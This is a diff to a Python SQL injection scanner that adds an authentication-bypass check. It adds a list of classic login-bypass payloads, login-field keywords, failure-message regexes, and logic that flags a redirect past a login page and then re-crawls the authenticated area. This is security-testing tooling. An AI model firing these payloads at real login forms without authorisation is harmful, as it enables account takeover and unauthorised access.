@@ -1,6 +1,6 @@
 """
 SQL Injection Scanner
-Detects error-based, boolean-based, and time-based SQL injection.
+Detects error-based, boolean-based, time-based, and authentication-bypass SQL injection.
 """
 import asyncio
 import time
@@ -64,12 +64,108 @@ BOOLEAN_PAIRS = [
     ("1) AND (1=1", "1) AND (1=2"),
 ]
 
+# ── Auth bypass detection ──────────────────────────────────────────────────
+
+# Payloads that are specifically useful for SQL injection authentication bypass.
+# These are always tested against fields that look like username/password fields.
+AUTH_BYPASS_PAYLOADS = frozenset([
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "' OR '1'='1' /*",
+    "\" OR \"1\"=\"1",
+    "\" OR \"1\"=\"1\"--",
+    ") OR ('1'='1",
+    ") OR 1=1--",
+    "1 OR 1=1",
+    "1 OR 1=1--",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "' OR 'x'='x",
+    "') OR ('x'='x",
+    "' OR ''='",
+    "1' OR '1'='1",
+])
+
+# Field name substrings that indicate a login/authentication field.
+_LOGIN_FIELD_KEYWORDS = frozenset([
+    "user", "login", "email", "mail", "account", "uname",
+    "pass", "pwd", "passwd", "password", "secret", "credential",
+])
+
+# Patterns in page source that suggest the login FAILED (not bypassed).
+LOGIN_FAILED_PATTERNS = [
+    r"invalid (user|pass|credential|login|email|account)",
+    r"(user|pass|login|credential|email|account).*(incorrect|wrong|invalid|fail|bad)",
+    r"authentication (fail|error|denied|invalid)",
+    r"login (fail|error|incorrect|denied|invalid)",
+    r"incorrect (user|pass|credential|password|login)",
+    r"wrong (user|pass|credential|password|login)",
+    r"(access|login|sign.?in) denied",
+    r"bad (user|credential|login|password)",
+    r"not (found|exist|recognized).*(user|account|email)",
+    r"(user|account|email).*(not found|does not exist|unknown)",
+    r"(please |try again|retry|re-enter)",
+    r"error.*log(in|on)",
+]
+
+# Path segments that indicate the browser is still on an auth/error page after submit.
+_AUTH_PAGE_KEYWORDS = (
+    "/login", "/signin", "/sign-in", "/logon",
+    "/auth", "/authenticate",
+    "/error", "/403", "/401", "/access-denied",
+)
+
 
 class SQLiScanner(BaseScanner):
     """SQL Injection vulnerability scanner."""
 
     CHECK_TYPE = "sqli"
     SEVERITY = "critical"
+
+    # ------------------------------------------------------------------
+    # Auth-bypass helpers
+    # ------------------------------------------------------------------
+
+    def _is_login_field(self, field_name: str) -> bool:
+        """Return True if the field name suggests a username or password input."""
+        n = field_name.lower()
+        return any(kw in n for kw in _LOGIN_FIELD_KEYWORDS)
+
+    def _detect_auth_bypass(self, original_url: str, source: str) -> tuple[bool, str]:
+        """
+        Check whether the browser was redirected to an authenticated area after
+        the payload was submitted.
+
+        Returns (bypassed: bool, post_url: str).
+        """
+        try:
+            post_url = self.browser.page.url
+        except Exception:
+            return False, ""
+
+        # URL must differ from where the form was submitted
+        if post_url.rstrip("/") == original_url.rstrip("/"):
+            return False, post_url
+
+        # Destination must not be another login / error page
+        post_lower = post_url.lower()
+        if any(kw in post_lower for kw in _AUTH_PAGE_KEYWORDS):
+            return False, post_url
+
+        # Response must not contain typical login-failure messages
+        if self.check_response_for_patterns(source, LOGIN_FAILED_PATTERNS):
+            return False, post_url
+
+        # Minimal content check — blank pages are not a successful bypass
+        if len(source.strip()) < 50:
+            return False, post_url
+
+        return True, post_url
 
     async def scan_field(
         self,
@@ -182,6 +278,33 @@ class SQLiScanner(BaseScanner):
                         severity="high",
                     )
                     findings.append(finding)
+                    break
+
+            # --- Check 4: Authentication bypass via SQLi ---
+            # Only applicable when the field looks like a username/password input
+            # and the payload is from the auth-bypass set.
+            if (
+                not is_url_param
+                and self._is_login_field(field_name)
+                and payload in AUTH_BYPASS_PAYLOADS
+            ):
+                bypassed, post_url = self._detect_auth_bypass(url, source)
+                if bypassed:
+                    finding = await self.record_finding(
+                        url=url,
+                        field_name=field_name,
+                        payload=payload,
+                        evidence=(
+                            f"SQL injection authentication bypass: login form at {url!r} "
+                            f"bypassed with payload {payload!r} — redirected to {post_url!r}"
+                        ),
+                        pair=pair,
+                        severity="critical",
+                    )
+                    findings.append(finding)
+                    # Notify the engine so it can re-crawl the authenticated surface
+                    if hasattr(self.engine, "signal_auth_bypass"):
+                        self.engine.signal_auth_bypass(url, payload, post_url)
                     break
 
             # Small delay to avoid overwhelming the server
